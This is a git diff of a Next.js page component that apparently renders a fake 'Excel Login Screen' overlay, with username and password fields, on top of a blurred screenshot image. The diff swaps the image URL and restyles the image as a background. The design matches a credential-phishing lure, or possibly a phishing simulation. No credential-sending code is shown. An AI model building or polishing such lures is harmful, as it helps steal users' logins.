@@ -7,7 +7,7 @@ import Link from 'next/link';
 declare const Swal: any;
 
 export default function Home() {
-  const imageUrl = "https://storage.googleapis.com/fsm-build-artefacts/PhishingSampleAnalysis10June-1.jpg";
+  const imageUrl = "https://i.imgur.com/Kz8q2yT.png";
 
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
@@ -35,8 +35,8 @@ export default function Home() {
   
   return (
     <>
-      {/* Blurred Image */}
-      <img id="blurredImage" src={imageUrl} alt="Blurred screenshot" />
+      {/* Background Image */}
+      <div id="backgroundImage" style={{ backgroundImage: `url(${imageUrl})` }}></div>
 
       {/* Login Overlay */}
       <div className="login-overlay" role="main" aria-label="Excel Login Screen">
@@ -73,5 +73,3 @@ export default function Home() {
     </>
   );
 }
-
-    
